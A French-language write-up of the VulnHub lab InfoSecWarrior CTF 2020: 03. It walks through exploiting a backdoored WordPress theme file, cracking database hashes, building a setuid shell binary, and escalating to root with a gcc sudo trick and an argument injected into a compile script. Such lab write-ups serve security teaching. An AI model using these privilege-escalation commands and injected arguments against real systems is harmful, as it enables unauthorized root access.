---
title: "Solution du CTF InfoSecWarrior CTF 2020: 03 de VulnHub"
tags: [CTF, VulnHub]
---


[InfoSecWarrior CTF 2020: 03](https://vulnhub.com/entry/infosecwarrior-ctf-2020-03,449/) est le dernier volet de sa série. Je l'ai trouvé plus brouillon que le précédent qui se démarquait des autres.

## Un faux sec

Nmap mentionne illico la présence d'un Wordpress avec deux comptes utilisateurs :

```
Nmap scan report for 192.168.56.174
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-wordpress-users: 
| Username found: krishna
| Username found: user1
|_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.174
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.174:80/
|     Form id: search-form-1
|     Form action: http://127.0.0.1/
|     
|     Path: http://192.168.56.174:80/
|     Form id: search-form-2
|_    Form action: http://127.0.0.1/
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /phpMyAdmin/: phpMyAdmin
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 5.3.2
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
```

Il a aussi trouvé via une énumération un `phpMyAdmin`.

La description du CTF indiquant la présence d'une backdoor donc j'ai aussi énuméré en profondeur sans trouver de fichiers inhabituels.

Finalement un fichier du Wordpress avait été backdooré. Il s'agit du fichier `404.php` de l'un des thèmes, c'est d'ailleurs la technique que j'emploie généralement sur les CTFs.

Ainsi on pouvait explorer le disque pour finalement lire un fichier `msg.txt` dans le dossier de l'utilisatrice `krishna` :

```
http://192.168.56.174/wp-content/themes/twentytwenty/404.php?ef=/home/krishna/&file=msg.txt
```

On obtenait le message suivant :

> I configured wordpress for you and make you admin of it. Your login credentials are same as your system login credentials.

Mais ça nous fait une belle jambe, car la backdoor en question ne permet pas l'exécution de commande. Elle permet toutefois d'uploader des fichiers, mais il semble qu'aucun des dossiers de la racine web ne soit écrivable...

Finalement quand on regarde la configuration du wordpress (fichier `wp-config.php`) on trouve les identifiants de base de données :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wpdb' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'root' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Sans la présence de la backdoor, on aurait tout aussi bien pu les deviner ou bruteforcer le `phpMyAdmin`.

Une fois connecté au `phpMyAdmin` on peut dumper les hashes MySQL. On retrouve un compte `khrisna` dont le hash (`*4DC8EC6204F12795FE54CC79FFA2A8579A947D04`) est connu de _crackstation.net_ (`infosec`).

On peut aussi dumper les identifiants du Wordpress :

```
ID	user_login	user_pass	user_nicename	user_email	user_url	user_registered	user_activation_key	user_status	display_name	
1	krishna	$P$B7CNxePWZrtyQSLKyQirMzEGoX87qx1	krishna	krishna@localhost.com		2020-03-12 13:42:12		0	krishna	
2	user1	$P$BgpY41TMEIWni3G0aryvshFyq6YFkK.	user1	user1@localhost.com		2020-03-16 06:07:48		0	user1	
```

Mais le mot de passe est toujours le même et comme vu précédemment les permissions sur les dossiers empêchent toute altération que l'on tente depuis la backdoor ou le Wordpress.

Sans le message récupéré plus tôt, on n'aurait pas forcément pensé à tester les identifiants `krishna` / `infosec` pour SSH. Ceux-ci nous ouvrent pourtant les portes du système.

## I put a spell on you

L'utilisatrice peut exécuter un script bash avec les droits de l'autre utilisateur présent, un dénommé `loopspell` :

```console
krishna@ck05:~$ sudo -l
Matching Defaults entries for krishna on ck05:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User krishna may run the following commands on ck05:
    (loopspell : ALL) NOPASSWD: /home/loopspell/code_compiler.sh
krishna@ck05:~$ cat /home/loopspell/code_compiler.sh
#!/bin/sh
source_code="${1}"
echo "Code is being compiling ..."
/usr/bin/gcc $source_code -o $(mktemp)
echo "You can find your compiled code in /tmp/ directory.
```

C'est plutôt restreint comme possibilités d'exploitation... En effet, ce fichier n'appartient même pas à `loopspell` :

```console
-rwxr-xr-x 1 root      root       162 Mar 16  2020 code_compiler.sh
```

Mais vous me direz, s'il est dans son dossier utilisateur il peut agir dessus comme pour le CTF [ColddWorld: Immersion]({% link _posts/2023-02-17-Solution-du-CTF-ColddWorld-Immersion-de-VulnHub.md %}), non ?

C'est là que ça se complique :

```console
$ ls -ald /home/loopspell/
drwxr-xr-x 5 root loopspell 4096 Mar 16  2020 /home/loopspell/
```

Il n'est même pas le owner de son dossier personnel... Mais avançons pas à pas.

En cherchant les binaires setuid j'en vois un qui est setuid pour `loopspell` :

```console
krishna@ck05:/tmp$ find / -type f -perm -u+s -ls 2> /dev/null 
   130372     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   130399     44 -rwsr-xr-x   1 root     root        43088 Jan  8  2020 /bin/mount
   130439     44 -rwsr-xr-x   1 root     root        44664 Mar 22  2019 /bin/su
   130423     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
   130457     28 -rwsr-xr-x   1 root     root        26696 Jan  8  2020 /bin/umount
--- snip ---
   148161   3552 -rwsr-xr-x   1 loopspell root             3637096 Nov  7  2019 /usr/bin/python2.7
   130958     44 -rwsr-xr-x   1 root      root               44528 Mar 22  2019 /usr/bin/chsh
   131051     76 -rwsr-xr-x   1 root      root               75824 Mar 22  2019 /usr/bin/gpasswd
   130956     76 -rwsr-xr-x   1 root      root               76496 Mar 22  2019 /usr/bin/chfn
   131160     40 -rwsr-xr-x   1 root      root               37136 Mar 22  2019 /usr/bin/newgidmap
   131303    148 -rwsr-xr-x   1 root      root              149080 Jan 31  2020 /usr/bin/sudo
   131178     60 -rwsr-xr-x   1 root      root               59640 Mar 22  2019 /usr/bin/passwd
--- snip ---
```

Ma première idée est d'utiliser ce Python setuid pour nous ajouter à la connexion SSH :

```console
krishna@ck05:/tmp$ /usr/bin/python2.7
Python 2.7.17 (default, Nov  7 2019, 10:07:09) 
[GCC 7.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(1002)
>>> open("/home/loopspell/.ssh/authorized_keys", "a").write("ssh-rsa AAAA---snip ---lmWnV7Ez8/h")
```

Malheureusement le compte semble demander un mot de passe quoi qu'il arrive...

Du coup, on va créer un binaire qui appelle `setuid` / `setgid` pour l'utilisateur et se servir de Python pour rajouter le flag sur ce binaire.

L'autorisation `sudo` sur le script de compilation va nous servir pour que le fichier compilé ait le bon owner à la création :

```console
krishna@ck05:/tmp$ cat loopshell.c 
#include <unistd.h>
#include <stdlib.h>

int main(void) {
        setreuid(1002, 1002);
        setregid(1002, 1002);
        system("/bin/bash");
        return 0;
}
krishna@ck05:/tmp$ sudo -u loopspell /home/loopspell/code_compiler.sh /tmp/loopshell.c
Code is being compiling ...
You can find your compiled code in /tmp/ directory.
krishna@ck05:/tmp$ /usr/bin/python2.7
Python 2.7.17 (default, Nov  7 2019, 10:07:09) 
[GCC 7.4.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(1002)
>>> import stat
>>> os.chmod("/tmp/tmp.FVXHo1Cs1i", stat.S_ISUID|stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)
>>> 
krishna@ck05:/tmp$ ls -al tmp.FVXHo1Cs1i
-rwsrwxrwx 1 loopspell loopspell 8400 Apr 12 12:11 tmp.FVXHo1Cs1i
krishna@ck05:/tmp$ ./tmp.FVXHo1Cs1i
loopspell@ck05:/tmp$ id
uid=1002(loopspell) gid=1001(krishna) groups=1001(krishna)
```

## Désassemblé au Cutter

Alternativement on trouve dans le dossier de `loopspell` un binaire nommé `backup.txt`. A l'exécution le binaire ne semble qu'afficher le message *Bla* en boucle, mais si on ouvre le binaire avec `Cutter` on remarque une fonction nommée `backup` qui semble afficher un mot de passe :

```nasm
backup ();
; var int c @ stack - 0x2d
; var int64_t var_2ch @ stack - 0x2c
; var int64_t var_28h @ stack - 0x28
; var int64_t var_24h @ stack - 0x24
; var int64_t var_20h @ stack - 0x20
; var int64_t var_1ch @ stack - 0x1c
; var int64_t var_18h @ stack - 0x18
; var int64_t var_14h @ stack - 0x14
; var int64_t canary @ stack - 0x10
0x000006fa      push    rbp
0x000006fb      mov     rbp, rsp
0x000006fe      sub     rsp, 0x30
0x00000702      mov     rax, qword fs:[0x28]
0x0000070b      mov     qword [canary], rax
0x0000070f      xor     eax, eax
0x00000711      mov     dword [var_28h], 0x51 ; 'Q'
0x00000718      mov     dword [var_24h], 0x7a ; 'z'
0x0000071f      mov     dword [var_20h], 0x75 ; 'u'
0x00000726      mov     dword [var_1ch], 0x69 ; 'i'
0x0000072d      mov     dword [var_18h], 0x31 ; '1'
0x00000734      mov     dword [var_14h], 0x6f ; 'o'
0x0000073b      lea     rdi, str.My_password_is ; 0x844 ; const char *format
0x00000742      mov     eax, 0
0x00000747      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x0000074c      mov     dword [var_2ch], 0
0x00000753      jmp     0x773
0x00000755      mov     eax, dword [var_2ch]
0x00000758      cdqe
0x0000075a      mov     eax, dword [rbp + rax*4 - 0x20]
0x0000075e      sub     eax, 1
0x00000761      mov     byte [c], al
0x00000764      movsx   eax, byte [c]
0x00000768      mov     edi, eax   ; int c
0x0000076a      call    putchar    ; sym.imp.putchar ; int putchar(int c)
0x0000076f      add     dword [var_2ch], 1
0x00000773      cmp     dword [var_2ch], 5
0x00000777      jle     0x755
0x00000779      mov     eax, 0
0x0000077e      mov     rdx, qword [canary]
0x00000782      xor     rdx, qword fs:[0x28]
0x0000078b      je      0x792
0x0000078d      call    __stack_chk_fail ; sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
0x00000792      leave
0x00000793      ret
```

Les lettres que l'on voit au début de la fonction ne constituent pas le mot de passe directement. Il y a en effet après une boucle qui fait une soustraction (adresse `0x0000075e`). Ce n'est pas compliqué de remonter d'un cran dans l'alphabet pour chaque lettre et d'obtenir ainsi le mot de passe `Pyth0n`.

Mais j'ai eu une solution encore plus fainéante : j'ai édité avec `Cutter` un `call` dans le `main` pour qu'il appelle à la place la fonction `backup`. J'ai sauvegardé l'exécutable et l'ai exécuté :

```console
$ ./backup.txt  | head -5

My password is Pyth0n
Bla
Bla
Bla
```

## Get The Fuck Ouuuuuuuuuuuuut!

Dans tous les cas, on découvre que `loopspell` a, lui aussi, des autorisations `sudo` :

```console
loopspell@ck05:/home/loopspell$ sudo -l
Matching Defaults entries for loopspell on ck05:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User loopspell may run the following commands on ck05:
    (ALL : ALL) /usr/bin/gcc
    (ALL : ALL) NOPASSWD: /home/loopspell/code_compiler.sh
```

On trouve [un GTFObin](https://gtfobins.github.io/gtfobins/gcc/) pour la commande `gcc` :

```console
loopspell@ck05:~$ sudo /usr/bin/gcc -wrapper /bin/sh,-s .
[sudo] password for loopspell: 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt
_________        ___.                 ____  __.      .__       .__     __    _______   .________
\_   ___ \___.__.\_ |__   ___________|    |/ _| ____ |__| ____ |  |___/  |_  \   _  \  |   ____/
/    \  \<   |  | | __ \_/ __ \_  __ \      <  /    \|  |/ ___\|  |  \   __\ /  /_\  \ |____  \ 
\     \___\___  | | \_\ \  ___/|  | \/    |  \|   |  \  / /_/  >   Y  \  |   \  \_/   \/       \
 \______  / ____| |___  /\___  >__|  |____|__ \___|  /__\___  /|___|  /__|    \_____  /______  /
        \/\/          \/     \/              \/    \/  /_____/      \/              \/       \/ 


flag = efa4c284b8e2a15674dfb369384c8bcf

This flag is a proof that you get the root shell.

Tag me on Twitter with @CyberKnight00
```

## Quickspell

Vu dans d'autres writeups : Il était possible d'utiliser le script bash pour lui faire utiliser le GTFObin directement :

```console
krishna@ck05:~$ sudo -u loopspell /home/loopspell/code_compiler.sh "-wrapper /bin/bash,-s ."
Code is being compiling ...
loopspell@ck05:~$ id
uid=1002(loopspell) gid=1002(loopspell) groups=1002(loopspell)
```
